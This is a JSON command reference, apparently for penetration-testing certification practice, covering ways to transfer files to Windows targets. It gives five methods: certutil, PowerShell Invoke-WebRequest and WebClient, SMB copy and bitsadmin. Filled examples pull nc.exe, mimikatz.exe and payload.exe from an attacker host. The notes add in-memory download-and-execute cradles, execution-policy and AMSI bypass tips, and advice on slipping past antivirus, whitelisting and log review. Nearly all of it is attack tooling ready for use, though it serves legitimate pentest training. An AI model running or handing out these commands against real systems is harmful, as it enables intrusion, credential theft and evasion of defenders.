{
  "category": "file-transfer",
  "subcategory": "windows-download",
  "description": "File download methods for Windows targets",
  "commands": [
    {
      "id": "ft-certutil-download",
      "name": "Windows: certutil Download",
      "category": "file-transfer",
      "subcategory": "windows-download",
      "command": "certutil -urlcache -f http://<LHOST>:<PORT>/<FILE> <OUTPUT>",
      "description": "Download file on Windows using certutil (built-in, often bypasses restrictions)",
      "tags": [
        "FILE_TRANSFER",
        "WINDOWS",
        "DOWNLOAD",
        "CERTUTIL",
        "QUICK_WIN",
        "LIVING_OFF_THE_LAND"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attack machine IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port on attack machine",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "Filename on server to download",
          "example": "nc.exe",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Destination path on target (can be same as <FILE>)",
          "example": "nc.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-urlcache": "Use URL cache function - actually just downloads the file, the 'cache' aspect is a quirk of certutil's certificate management tool being repurposed for downloads",
        "-f": "Force fetch - overwrites existing cached entry or file. Without this, download may fail if file exists",
        "-split": "Alternative to -urlcache -f for large files - splits download into chunks. Useful for files >10MB",
        "http://": "Supports both HTTP and HTTPS URLs - for HTTPS without valid cert, it may still work (less strict than PowerShell)"
      },
      "success_indicators": [
        "****  Online  ****",
        "CertUtil: -URLCache command completed successfully",
        "File appears on disk: dir <OUTPUT>"
      ],
      "failure_indicators": [
        "0x80072ee7 - Server name cannot be resolved (check IP/DNS)",
        "0x80070002 - The system cannot find the file (wrong path or file not on server)",
        "0x800c0005 - Access denied (AV/AppLocker blocked)"
      ],
      "troubleshooting": {
        "File downloaded but certutil shows error": "Check if file exists anyway: dir <OUTPUT>. Sometimes reports error but file transferred successfully",
        "Access is denied": "Try different output location: C:\\Windows\\Tasks\\<OUTPUT> or C:\\Users\\Public\\<OUTPUT>",
        "AV flagged certutil": "Use alternative: ft-powershell-webclient or ft-bitsadmin-download",
        "Cannot resolve hostname": "Use IP address instead of hostname in URL",
        "Large file fails": "Use -split flag or switch to ft-smb-download for files >100MB"
      },
      "prerequisites": [
        "ft-python-http-server"
      ],
      "alternatives": [
        "ft-powershell-iwr",
        "ft-powershell-webclient",
        "ft-bitsadmin-download"
      ],
      "next_steps": [
        "ft-base64-encode",
        "ft-smb-download"
      ],
      "notes": "certification METHODOLOGY: First choice for Windows downloads. Certutil is a legitimate Windows certificate management tool, so it's often whitelisted by AV and application whitelisting solutions. Living-off-the-land binary (LOLBin).\n\nMANUAL ALTERNATIVE: Copy/paste file contents if very small, or use ft-vbscript-download on ancient systems.\n\nWHY IT WORKS: Windows admins rarely block certutil because it's used for legitimate certificate operations. Defenders often miss it in logs.\n\nEXAM TIP: If initial shell is cmd.exe, this is your fastest download method. Test immediately after getting shell. Can also encode/decode Base64: certutil -encode in.exe out.txt && certutil -decode out.txt restored.exe\n\nCOMMON GOTCHA: Leaves cache artifacts in C:\\Users\\<USER>\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\n\nTIME ESTIMATE: 2-10 seconds for typical tools (100KB-10MB). Faster than PowerShell for small files.",
      "filled_example": "certutil -urlcache -f http://10.10.14.5:8000/nc.exe nc.exe"
    },
    {
      "id": "ft-powershell-iwr",
      "name": "Windows: PowerShell Invoke-WebRequest",
      "category": "file-transfer",
      "subcategory": "windows-download",
      "command": "powershell -ep bypass -c \"Invoke-WebRequest -Uri http://<LHOST>:<PORT>/<FILE> -OutFile <OUTPUT>\"",
      "description": "Download file using PowerShell Invoke-WebRequest (modern, verbose progress)",
      "tags": [
        "FILE_TRANSFER",
        "WINDOWS",
        "POWERSHELL",
        "DOWNLOAD"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attack machine IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "winPEAS.exe",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Destination file path",
          "example": "C:\\Temp\\winPEAS.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-ep bypass": "Execution policy bypass - allows scripts to run even if execution policy is Restricted. Required for most pentest targets",
        "-c": "Execute command - runs the following PowerShell code as a one-liner",
        "Invoke-WebRequest": "PowerShell cmdlet for HTTP operations - more feature-rich than WebClient but slower for simple downloads",
        "-Uri": "URL parameter - can be HTTP or HTTPS, supports redirects",
        "-OutFile": "Output file path - where to save downloaded content",
        "-UseBasicParsing": "Skip IE engine dependency - use if Invoke-WebRequest fails with 'Internet Explorer not initialized' error"
      },
      "success_indicators": [
        "StatusCode : 200",
        "File created on disk",
        "No error output"
      ],
      "failure_indicators": [
        "Execution Policy error - add -ep bypass",
        "Internet Explorer engine is not available - add -UseBasicParsing",
        "AMSI flagged malicious content",
        "Unable to connect - firewall or wrong IP/port"
      ],
      "troubleshooting": {
        "Internet Explorer engine error": "Add -UseBasicParsing flag: IWR -Uri <URL> -OutFile <FILE> -UseBasicParsing",
        "AMSI detection": "Use obfuscation or alternative: ft-certutil-download",
        "Execution policy blocked": "Ensure -ep bypass is first flag to powershell.exe",
        "SSL/TLS error on HTTPS": "Add: -SkipCertificateCheck (PowerShell 6+) or use HTTP instead",
        "Progress bar freezes": "Add -UseBasicParsing to disable progress indicators"
      },
      "prerequisites": [
        "ft-python-http-server"
      ],
      "alternatives": [
        "ft-certutil-download",
        "ft-powershell-webclient"
      ],
      "next_steps": [
        "ft-powershell-upload"
      ],
      "notes": "certification METHODOLOGY: Second choice for Windows downloads after certutil. More modern and flexible, but can be slower and more detectable. Alias IWR can be used in PowerShell prompt: IWR http://<IP>/<FILE> -OutFile <FILE>\n\nMANUAL ALTERNATIVE: Use browser if RDP available, but that's rarely the case in certification shells.\n\nWHY -ep bypass: Most Windows servers have Restricted execution policy preventing script execution. This bypasses it for this session only (non-persistent).\n\nEXAM TIP: If you get 'Internet Explorer not initialized' error, add -UseBasicParsing. For in-memory execution without touching disk: IEX(IWR http://<IP>/script.ps1 -UseBasicParsing)\n\nVS WEBCLIENT: Invoke-WebRequest shows progress and is more PowerShell-native, but WebClient.DownloadFile() is faster for large files.\n\nTIME ESTIMATE: 5-20 seconds for typical tools, slower than certutil due to PowerShell overhead.",
      "filled_example": "powershell -ep bypass -c \"Invoke-WebRequest -Uri http://10.10.14.5:8000/winPEAS.exe -OutFile C:\\Temp\\winPEAS.exe\""
    },
    {
      "id": "ft-powershell-webclient",
      "name": "Windows: PowerShell WebClient Download",
      "category": "file-transfer",
      "subcategory": "windows-download",
      "command": "powershell -ep bypass -c \"(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>:<PORT>/<FILE>','<OUTPUT>')\"",
      "description": "Download file using .NET WebClient class (faster than Invoke-WebRequest)",
      "tags": [
        "FILE_TRANSFER",
        "WINDOWS",
        "POWERSHELL",
        "DOWNLOAD"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attack machine IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "mimikatz.exe",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Full destination path (must include filename)",
          "example": "C:\\Windows\\Temp\\mimikatz.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "New-Object System.Net.WebClient": "Instantiate .NET WebClient class - provides HTTP download capabilities without PowerShell cmdlet overhead",
        "DownloadFile()": "Synchronous download method - blocks until complete, faster than Invoke-WebRequest for large files",
        "Single quotes": "Required around URLs to prevent PowerShell variable expansion if URL contains $ or other special chars",
        "Full output path": "Must include directory AND filename - will not infer filename from URL like Invoke-WebRequest"
      },
      "success_indicators": [
        "Command completes without output (silence means success)",
        "File exists: Test-Path <OUTPUT> returns True",
        "File size matches source"
      ],
      "failure_indicators": [
        "Exception calling DownloadFile - network error",
        "Access to path denied - permission issue",
        "Could not find file - wrong URL or file not on server"
      ],
      "troubleshooting": {
        "No output but file missing": "Check output path is valid directory: Test-Path C:\\Windows\\Temp",
        "SSL/TLS error": "Disable cert validation: [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; then run download",
        "Access denied writing file": "Try different directory: C:\\Users\\Public\\, C:\\Windows\\Tasks\\, C:\\ProgramData\\",
        "Proxy blocking connection": "Set proxy: $wc = New-Object System.Net.WebClient; $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials"
      },
      "prerequisites": [
        "ft-python-http-server"
      ],
      "alternatives": [
        "ft-powershell-iwr",
        "ft-certutil-download"
      ],
      "next_steps": [],
      "notes": "certification METHODOLOGY: Fastest PowerShell download method for large files (>10MB). Uses .NET directly instead of PowerShell cmdlets, reducing overhead. No progress indicator - silent execution.\n\nMANUAL ALTERNATIVE: Could use WinHTTP or BITS COM objects, but WebClient is simplest.\n\nIN-MEMORY VARIANT: For in-memory execution without touching disk: IEX(New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')\n\nEXAM TIP: Use this for large payloads (Mimikatz, Rubeus, etc.) where speed matters. Remember the filename in output path - easy to forget and get errors.\n\nVS INVOKE-WEBREQUEST: WebClient is 2-5x faster for files >10MB, no IE dependency, but less features (no -UseBasicParsing issues).\n\nTIME ESTIMATE: 2-5 seconds for tools under 5MB, faster than IWR and comparable to certutil.",
      "filled_example": "powershell -ep bypass -c \"(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/mimikatz.exe','C:\\Windows\\Temp\\mimikatz.exe')\""
    },
    {
      "id": "ft-smb-download",
      "name": "Windows: SMB Copy from Share",
      "category": "file-transfer",
      "subcategory": "windows-download",
      "command": "copy \\\\<LHOST>\\<SHARE>\\<FILE> <DEST>",
      "description": "Copy file from Kali SMB share to Windows target (fastest for large files)",
      "tags": [
        "FILE_TRANSFER",
        "WINDOWS",
        "SMB",
        "DOWNLOAD",
        "QUICK_WIN"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attack machine IP running SMB server",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<SHARE>",
          "description": "SMB share name configured in impacket-smbserver",
          "example": "share",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "Filename on share to copy",
          "example": "nc.exe",
          "required": true
        },
        {
          "name": "<DEST>",
          "description": "Destination path on target",
          "example": "C:\\Temp\\nc.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "\\\\\\\\<LHOST>\\\\<SHARE>": "UNC path format - standard Windows network path to access SMB shares",
        "copy": "Native Windows command - can also use xcopy /y for overwrite without prompt, or robocopy for advanced options",
        "/y": "Optional flag to suppress overwrite confirmation prompt - useful in scripts: copy /y source dest"
      },
      "success_indicators": [
        "1 file(s) copied",
        "File exists at destination: dir <DEST>",
        "File size matches source"
      ],
      "failure_indicators": [
        "The network path was not found - SMB server not running or wrong IP/share name",
        "Access is denied - need authentication or insufficient permissions",
        "Network name cannot be found - firewall blocking port 445"
      ],
      "troubleshooting": {
        "Network path not found": "Verify SMB server running: sudo netstat -antp | grep 445. Check share name matches",
        "Access denied on Windows 10+": "Use authenticated SMB: On Kali add -username user -password pass. On Windows: net use \\\\<IP>\\share /user:user pass",
        "Port 445 blocked": "Check firewall: Test-NetConnection <IP> -Port 445, or use alternative: ft-certutil-download",
        "Direct execution fails": "Can execute directly from share without copying: \\\\<IP>\\share\\tool.exe",
        "Authentication keeps prompting": "Clear cached creds: net use \\\\<IP>\\share /delete, then reconnect with correct creds"
      },
      "prerequisites": [
        "ft-smb-server"
      ],
      "alternatives": [
        "ft-certutil-download",
        "ft-powershell-webclient"
      ],
      "next_steps": [],
      "notes": "certification METHODOLOGY: Fastest transfer method for Windows targets on internal network. 10-100x faster than HTTP for large files (>10MB). Port 445 often allowed internally even when HTTP egress is blocked.\n\nMANUAL ALTERNATIVE: Mount share persistent: net use Z: \\\\<IP>\\share then access as Z:\\ drive.\n\nDIRECT EXECUTION: Can run tools directly from share without copying: \\\\<IP>\\share\\winPEAS.exe > output.txt (saves disk space, leaves less artifacts)\n\nEXAM TIP: If HTTP download fails or is slow, immediately try SMB. On newer Windows (10+), you'll need authenticated SMB - setup with -username/-password flags on impacket-smbserver.\n\nSECURITY EVASION: SMB transfers are harder to detect in logs than HTTP downloads (blends with normal network file sharing).\n\nTIME ESTIMATE: Near-instant for files under 50MB on local network, limited only by network speed.",
      "filled_example": "copy \\\\10.10.14.5\\share\\nc.exe C:\\Temp\\nc.exe"
    },
    {
      "id": "ft-bitsadmin-download",
      "name": "Windows: bitsadmin Download",
      "category": "file-transfer",
      "subcategory": "windows-download",
      "command": "bitsadmin /transfer <JOB_NAME> /download /priority high http://<LHOST>:<PORT>/<FILE> <OUTPUT>",
      "description": "Download file using Windows BITS service (background transfer, stealthier)",
      "tags": [
        "FILE_TRANSFER",
        "WINDOWS",
        "DOWNLOAD",
        "BITSADMIN"
      ],
      "variables": [
        {
          "name": "<JOB_NAME>",
          "description": "Arbitrary transfer job name (required, can be anything)",
          "example": "myDownload",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attack machine IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "HTTP server port",
          "example": "8000",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to download",
          "example": "payload.exe",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "Full destination path (must be absolute)",
          "example": "C:\\Windows\\Temp\\payload.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "/transfer": "Create and execute transfer job in one command - simpler than /create + /addfile + /resume workflow",
        "/download": "Transfer mode - specifies download direction (vs /upload for uploads)",
        "/priority": "Job priority - high/normal/low. Use high for interactive transfers, low for stealthy background transfers",
        "<JOB_NAME>": "Job identifier - used for tracking transfer status. Can list all jobs: bitsadmin /list",
        "Absolute path required": "OUTPUT must be full path like C:\\file.exe, not relative like file.exe"
      },
      "success_indicators": [
        "Transfer job completed",
        "BITS transfer job <JOB_NAME> is complete",
        "File exists at destination"
      ],
      "failure_indicators": [
        "Unable to add file - path error or network issue",
        "Transfer job failed - connection timeout",
        "BITS service disabled"
      ],
      "troubleshooting": {
        "Transfer job failed": "Check BITS service running: sc query bits, start if needed: net start bits",
        "Access denied": "Try different output directory: C:\\Users\\Public\\, C:\\ProgramData\\",
        "Slow or stalled transfer": "Cancel job: bitsadmin /cancel <JOB_NAME>, then retry with /priority high",
        "Job stuck in queue": "List all jobs: bitsadmin /list /verbose, cancel stuck job, retry",
        "Cannot add file error": "Ensure OUTPUT is absolute path, not relative"
      },
      "prerequisites": [
        "ft-python-http-server"
      ],
      "alternatives": [
        "ft-certutil-download",
        "ft-powershell-webclient"
      ],
      "next_steps": [],
      "notes": "certification METHODOLOGY: Third choice for Windows downloads when certutil and PowerShell are blocked or monitored. Uses Windows Background Intelligent Transfer Service (BITS) - designed for downloading Windows Updates, so often whitelisted.\n\nMANUAL ALTERNATIVE: Could use GUI Component Services to create BITS job, but command line is faster.\n\nSTEALTH BENEFITS: BITS transfers blend with Windows Update traffic. Uses /priority low for stealthy background transfers that throttle when network busy.\n\nEXAM TIP: Slower than certutil/PowerShell for small files but more reliable for large files (auto-resumes on connection loss). Can be detected by EDR monitoring BITS jobs.\n\nLIMITATIONS: Requires BITS service running (enabled by default). Must use absolute paths for OUTPUT.\n\nTIME ESTIMATE: 10-30 seconds for typical tools (slower due to BITS overhead), but reliable for files >50MB.",
      "filled_example": "bitsadmin /transfer myDownload /download /priority high http://10.10.14.5:8000/payload.exe C:\\Windows\\Temp\\payload.exe"
    }
  ]
}